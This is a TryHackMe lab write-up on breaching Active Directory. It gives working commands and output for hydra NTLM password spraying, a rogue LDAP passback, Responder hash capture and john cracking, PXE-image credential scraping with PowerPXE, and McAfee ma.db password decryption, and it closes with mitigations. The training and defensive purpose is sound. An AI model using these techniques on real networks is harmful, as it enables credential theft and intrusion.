# TryHackMe | Breaching Active Directory

Brute-forcing Logins
--------------------

> ...most AD environments have account lockout configured...we choose and **use one password** and attempt to authenticate with all the usernames we have acquired.

One password, multiple usernames.

> You have been provided with a list of usernames discovered during a red team OSINT exercise. The OSINT exercise also indicated the organisation's initial onboarding password, which sems to be "Changeme123".

In our browser, we go to `http://ntlmauth.za.tryhackme.com` . You could do some **manual testing** here at first to see if you can get an easy win.

![](https://benheater.com/content/images/2022/08/image-14.png)

If that doesn't work, you could try **brute forcing logins** with a tool like `hydra` . 


### Using Hydra to Brute-force NTLM

On the page pictured above, we have a basic `HTTP GET` request with NTLM authentication. If we test the login manually and inspect it with Wireshark, we should see a HTTP status code for bad logins.

![](https://benheater.com/content/images/2022/08/image-18.png)

Junk login to test the HTTP response

```
No.	Time	Source	Destination	Protocol	SPort	DPort	Info
1	0.000000000	10.50.x.x	10.200.54.201	HTTP	58370	80	GET / HTTP/1.1 
3	0.096313045	10.200.54.201	10.50.x.x	HTTP	80	58370	HTTP/1.1 401 Unauthorized  (text/html)
9	27.670996834	10.50.x.x	10.200.54.201	HTTP	58370	80	GET / HTTP/1.1 
11	27.765413572	10.200.54.201	10.50.x.x	HTTP	80	58370	HTTP/1.1 401 Unauthorized  (text/html)
13	27.765861414	10.50.x.x	10.200.54.201	HTTP	58370	80	GET / HTTP/1.1 , NTLMSSP_NEGOTIATE
14	27.861316470	10.200.54.201	10.50.x.x	HTTP	80	58370	HTTP/1.1 401 Unauthorized , NTLMSSP_CHALLENGE (text/html)
15	27.861727325	10.50.x.x	10.200.54.201	HTTP	58370	80	GET / HTTP/1.1 , NTLMSSP_AUTH, User: za.tryhackme.com\nosuchuser
17	27.963272502	10.200.54.201	10.50.x.x	HTTP	80	58370	HTTP/1.1 401 Unauthorized  (text/html)
```


**Frame 1:** First request to the page  
**Frame 3:** Server responds `HTTP 401 Unauthorized`  
**Frame 13:** Send a NTLM authentication request  
**Frame 14:** Server sends a challenge  
**Frame 15:** I send a response as `za.tryhackme.com\nosuchuser:nosuchpassword`  
**Frame 17:** Server responds `HTTP 401 Unauthorized` due to invalid credentials

So, we know **a request fails** when the server responds with `HTTP 401` . Let's see what we can cook up in hydra.

```
# -I = do not read a restore file if present
# -V = very verbose output
# -L = list of usernames
# -p = single password
# ntlmauth.za.tryhackme.com = target
# http-get = hydra module
# '/:A=NTLM:F=401'
    # / = path to the login page
    # A=NTLM = NTLM authentication type
    # F=401 = failure code
    
hydra -I -V -L ./usernames.txt -p 'Changeme123' ntlmauth.za.tryhackme.com http-get '/:A=NTLM:F=401'
```


![](https://benheater.com/content/images/2022/08/image-19.png)

Looks like four users are still using the **default password** on their accounts.

```
[80][http-get] host: ntlmauth.za.tryhackme.com   login: hollie.powell   password: Changeme123
[80][http-get] host: ntlmauth.za.tryhackme.com   login: heather.smith   password: Changeme123
[80][http-get] host: ntlmauth.za.tryhackme.com   login: gordon.stevens   password: Changeme123
[80][http-get] host: ntlmauth.za.tryhackme.com   login: georgina.edwards   password: Changeme123

```

LDAP Passback
-------------

### Intalling rogue LDAP

```
# Install OpenLDAP
 $ sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
```


![breachad.1](https://0xfk.github.io/offensive-security/docs/images/breachad.1.png)

Adding you prefered password

| ![breachad.3](https://0xfk.github.io/offensive-security/docs/images/breachad.3.png) | ![breachad.2](https://0xfk.github.io/offensive-security/docs/images/breachad.2.png) | | ————————————— | ————————————— |

### Reconfigure the rogue LDAP

```
$ sudo dpkg-reconfigure -p low slapd
```


![Screen.1](https://0xfk.github.io/offensive-security/docs/images/Screen.1.png)

![Screen.2](https://0xfk.github.io/offensive-security/docs/images/Screen.2.png)

![Screen.3](https://0xfk.github.io/offensive-security/docs/images/Screen.3.png)

![Screen.4](https://0xfk.github.io/offensive-security/docs/images/Screen.4.png)

![Screen.5](https://0xfk.github.io/offensive-security/docs/images/Screen.5.png)

![Screen.6](https://0xfk.github.io/offensive-security/docs/images/Screen.6.png)

![Screen.7](https://0xfk.github.io/offensive-security/docs/images/Screen.7.png)

![Screen.8](https://0xfk.github.io/offensive-security/docs/images/Screen.8.png)

![Screen .11](https://0xfk.github.io/offensive-security/docs/images/Screen%20.11.png)

### Downgrade LDAP to Vulnerable Authentication

To make the LDAP vulnerable we will configure our LDAP server only supports PLAIN and LOGIN authentication methods

```
# create properties file
$ cat olcSaslSecProps.ldif 
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```


```
# restart LDAP with new properties file
$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"

# Verify the Authentication mechanizm
$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
dn:
supportedSASLMechanisms: PLAIN
supportedSASLMechanisms: LOGIN
```

### Capture printer request

Using the display filter, `ldap` in Wireshark (you can also use `tcpdump` or `tshark` too) – we can see the LDAP exchange between the printer and our rogue LDAP server.

![](https://benheater.com/content/images/2022/08/image-20.png)

Here, in **frame 28**, we can see the cleartext authentication from the printer.

```
Lightweight Directory Access Protocol
    LDAPMessage bindRequest(22) "za.tryhackme.com\svcLDAP" simple
        messageID: 22
        protocolOp: bindRequest (0)
            bindRequest
                version: 2
                name: za.tryhackme.com\svcLDAP
                authentication: simple (0)
                    simple: tryhackmeldappass1@
        [Response In: 30]
```


The password for `svcLDAP` is `tryhackmeldappass1@` . Now that we've successfully completed the passback attack, stop your LDAP server.

```
sudo systemctl disable --now slapd
```

Bonus: LDAP NetNTLM Hash and Responder
--------------------------------------

We're going to use the same passback attack, but this time, the rogue server will be `Responder` . Responder does not have a configuration mechanism to downgrade the authentication to plaintext login, but we can still:

*   Capture the NetNTLM hash
*   Then, try to crack it (you **can not** pass-the-hash with NetNTLM hashes)

### Configure Responder

```
sudo nano /etc/responder/Respoder.conf
```


```
; Servers to start
SQL = Off
SMB = Off
RDP = Off
Kerberos = Off
FTP = Off
POP = Off
SMTP = Off
IMAP = Off
HTTP = Off
HTTPS = Off
DNS = Off
LDAP = On
DCERPC = Off
WINRM = Off
```


All servers off except for LDAP

Now, run Responder and try the passback attack again.

```
sudo responder -I tun0 -v
```


![](https://benheater.com/content/images/2022/08/image-21.png)

Since we know the password from the exercise from above, let's just go through a dummy cracking example. First, copy and paste the entire **Hash** string into file.

```
echo 'svcLDAP::za.tryhackme.com:9F9D4EDFE346DCAF00000000000000000000000000000000:F0468927F3B22A1519CC86EB858D75978929ACBCEBD1AAFE:80aca325f5429be9' > hash
echo 'tryhackmeldappass1@' > wordlist
john --wordlist=./wordlist hash
```


![](https://benheater.com/content/images/2022/08/image-22.png)

Server Message Block (SMB)
--------------------------

*   Used by Windows (and Linux) systems to facilitate file sharing, remote administration, etc.
*   Newer versions of the SMB protocol resolve some vulnerabilities, but companies with legacy systems continue to use older versions.
*   SMB communications are not encrypted and can be intercepted.

LLMNR, NBT-NS, and WPAD
-----------------------

*   NBT-NS and LLMNR are ways to resolve hostnames to IP addresses on the LAN.
*   WPAD is a way for Windows hosts to auto-discover web proxies.
*   These protocols are broadcast on the LAN and can therefore be poisoned, tricking hosts into thinking they're talking with the intended target.
*   Since these are **layer 2** protocols, any time we use Responder to capture and poison requests, **we must be on the same LAN as the target**.

Practical
---------

### Configure Responder

Edit the Responder configuration file and make sure these servers are set to `On` :

*   SMB
*   HTTP
*   The rest are irrelevant to the exercise

```
sudo nano /etc/responder/Responder.conf
```


```
[Responder Core]

; Servers to start
SQL = Off
SMB = On 
RDP = Off
Kerberos = On 
FTP = On 
POP = Off 
SMTP = Off
IMAP = Off
HTTP = On 
HTTPS = Off 
DNS = Off 
LDAP = On
DCERPC = Off
WINRM = Off
```


### Capture the NetNTLM Hash

Now, run Responder and wait for the client to connect. A simulated host **runs every 30 minutes**, so be patient.

```
sudo responder -I tun0 -v
```


tun0 is my OpenVPN interface

![](https://benheater.com/content/images/2022/08/image-23.png)

### Crack the Hash

```
echo 'svcFileCopy::ZA:7cc90fae8c5d340d:4A9DCB457EC6B03CB8590632B3022206:010100000000000000CCDAED93A7D801F341996CD2C757EC00000000020008004E00360034004C0001001E00570049004E002D003500310032004B004C0041005A004400450039004F0004003400570049004E002D003500310032004B004C0041005A004400450039004F002E004E00360034004C002E004C004F00430041004C00030014004E00360034004C002E004C004F00430041004C00050014004E00360034004C002E004C004F00430041004C000700080000CCDAED93A7D80106000400020000000800300030000000000000000000000000200000A5ABACBF56562183324A9E5783EA22C522BE71493FF32CF3AAA81CA6A4F7CE880A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00350032002E00330034000000000000000000' > hash
john --wordlist=./passwordlist.txt hash
```


![](https://benheater.com/content/images/2022/08/image-24.png)


What is the value of the cracked password associated with the challenge that was captured?

Read through and understand how Microsoft Deployment Toolkit (MDT) is used to deploy operating systems over the network using PXE boot; and how SCCM is used to manage hosts after they've been provisioned.

Both of these technologies have the advantage of being a centralized management system for hosts. But, they also represent a massive attack surface if an attacker were to compromise one of these services.

If an attacker can pretend to be a PXE booting client on the network and request an image from MDT via a DHCP request, then the attacker could inject or scrape information from the PXE image during and after the setup process.

Practical
---------

### SSH to the Jump Host

SSH to the jump host where we will be experimenting with the `PowerPXE` PowerShell module.

```
ssh thm@THMJMP1.za.tryhackme.com
```


Use the password: `Password1@`

### Create a Working Directory

Create a folder for your session using your username and copy the `powerpxe` directory to your user folder.

```
powershell -ep bypass
mkdir 0xBEN
cd 0xBEN
cp -Recurse C:\powerpxe .
```


### Pretend You're a PXE Client

We are going to simulate a PXE client sending a DHCP request and receiving a list of BCD files for configuration. In your browser, navigate to `http://pxeboot.za.tryhackme.com/` and just pretend you're a DHCP client that's received a list of files. Note the `x64...` file, not `x64uefi...` . Copy the file name.

Use TFTP to connect to the MDT server and retrieve the BCD file and scrape it for credentials.

```
tftp -i (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress GET "\Tmp\x64{BFA810B9-DF7D-401C-B5B6-2F4D37258344}.bcd" conf.bcd
```


![](https://benheater.com/content/images/2022/08/image-28.png)

### Analyze the Boot Image

At this point, I'm working in the directory `C:\Users\thm\0xBEN` . And, I've downloaded the BCD file and copied the `powerpxe` folder. First, let's get the location of the WIM file, which is the Windows bootable image.

```
Import-Module .\powerpxe\PowerPXE.ps1
$bcdfile = "conf.bcd"
Get-WimFile -bcdFile $bcdfile

>> Parse the BCD file: conf.bcd 
>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim 
\Boot\x64\Images\LiteTouchPE_x64.wim
```


Now, that we know the path to download the image, let's proceed. **This is a full Windows image** and very large. It's going to take a while.

```
$wimfile = '\Boot\x64\Images\LiteTouchPE_x64.wim'
$mdtserver = (Resolve-DnsName thmmdt.za.tryhackme.com).IPAddress
tftp -i $mdtserver GEt "$wimfile" pxeboot.wim

Transfer successful: 341899611 bytes in 277 second(s), 1234294 bytes/s
```


Finally, scrape the image for credentials.

```
Get-FindCredentials -WimFile .\pxeboot.wim

>>>> Finding Bootstrap.ini 
>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
>>>> >>>> UserID = svcMDT
>>>> >>>> UserDomain = ZA
>>>> >>>> UserPassword = PXEBootSecure1@ 
```

Read through and understand how configuration files can be used to enumerate Active Directory credentials on **both domain-joined and non-domain-joined hosts**.

Some example configuration files include:

*   Web application config files
*   Service configuration files
*   Registry keys
*   Centrally deployed applications

Tools such as [Seatbelt](https://github.com/GhostPack/Seatbelt?ref=benheater.com) can be used to aid in configuration file discovery.

Managed Applications
--------------------

The example given in this section uses the McAfee Enterprise Endpoint Security application, which is an endpoint detection and response (EDR) agent. This application stores an Active Directory credential in the `C:\ProgramData\McAfee\Agent\DB\ma.db` file, which could be read by an attacker who's managed to gain a foothold on a host where this application is installed.

The `ma.db` file is a SQLite file which can be read using the `sqlite3` utility or the `sqlitebrowser` tool as demonstrated in the exercise.

### Secure Copy the File

```
scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db
```


Use the password: `Password1@`

### Inspect the Database

You can inspect the data using `sqlitebrowser` or `sqlite3` , depending on your preference. In the exercise, we are directed to the `AGENT_REPOSITORIES` table and particularly interested in the `DOMAIN` , `AUTH_USER` , and `AUTH_PASSWD` columns.

#### SQLite

```
sqlite3 ./ma.db

# List the tables in the database
# Note the AGENT_REPOSITORIES table we're interested in
sqlite> .tables
AGENT_CHILD              AGENT_PROXIES            MA_DATACHANNEL_MESSAGES
AGENT_LOGS               AGENT_PROXY_CONFIG     
AGENT_PARENT             AGENT_REPOSITORIES


# Dump the table schema
# Note the column names
    # NAME
    # UNIQUE
    # REPO_TYPE
    # URL_TYPE
    # NAMESPACE
    # PROXY_USAGE
    # AUTH_TYPE
    # ENABLED
    # SERVER_FQDN
    # SERVER_IP
    # SERVER_NAME
    # PORT
    # SSL_PORT
    # DOMAIN
    # AUTH_USER
    # AUTH_PASSWD
    # IS_PASSWD_ENCRYPTED
    # PING_TIME
    # SUBNET_DISTANCE
    # SITELIST_ORDER
    # STATE
sqlite> .schema AGENT_REPOSITORIES
CREATE TABLE AGENT_REPOSITORIES(NAME TEXT NOT NULL UNIQUE, REPO_TYPE INTEGER NOT NULL, URL_TYPE INTEGER NOT NULL, NAMESPACE INTEGER NOT NULL, PROXY_USAGE INTEGER NOT NULL, AUTH_TYPE INTEGER NOT NULL, ENABLED INTEGER NOT NULL, SERVER_FQDN TEXT, SERVER_IP TEXT, SERVER_NAME TEXT,PORT INTEGER, SSL_PORT INTEGER,PATH TEXT, DOMAIN TEXT, AUTH_USER TEXT, AUTH_PASSWD TEXT, IS_PASSWD_ENCRYPTED INTEGER NOT NULL, PING_TIME INTEGER NOT NULL, SUBNET_DISTANCE INTEGER NOT NULL, SITELIST_ORDER INTEGER NOT NULL, STATE INTEGER NOT NULL, PRIMARY KEY (NAME) ON CONFLICT REPLACE);


# Select the desired columns from the table
sqlite> SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES;
za.tryhackme.com|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==


# Exit sqlite3
sqlite> .quit
```


#### Sqlitebrowser

```
# Run the process in the background
sqlitebrowser ./ma.db &
```


Click on the `Browse Data` tab and choose the `AGENT_REPOSITORIES` table.

![](https://benheater.com/content/images/2022/08/image-29.png)

### Reverse the Encrypted Password

We now know the service account username is `svcAV` and we have an encrypted password stored as a base64 string. Let's use the script provided in the exercise files to crack it.

```
encrypted_pw='jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
python2 ./mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py $encryped_pw
```


![](https://benheater.com/content/images/2022/08/image-30.png)

We now know the `svcAV` user's password is `MyStrongPassword!` .

Read through and understand **some** of the ways to reduce the Active Directory attack surface available to attackers.

*   _User awareness and training - The weakest link in the cybersecurity chain is almost always users. Training users and making them aware that they should be careful about disclosing sensitive information such as credentials and not trust suspicious emails reduces this attack surface._
*   _Limit the exposure of AD services and applications online - Not all applications must be accessible from the internet, especially those that support NTLM and LDAP authentication. Instead, these applications should be placed in an intranet that can be accessed through a VPN. The VPN can then support multi-factor authentication for added security._
*   _Enforce Network Access Control (NAC) - NAC can prevent attackers from connecting rogue devices on the network. However, it will require quite a bit of effort since legitimate devices will have to be allowlisted._
*   _Enforce SMB Signing - By enforcing SMB signing, SMB relay attacks are not possible._
*   _Follow the principle of least privileges - In most cases, an attacker will be able to recover a set of AD credentials. By following the principle of least privilege, especially for credentials used for services, the risk associated with these credentials being compromised can be significantly reduced._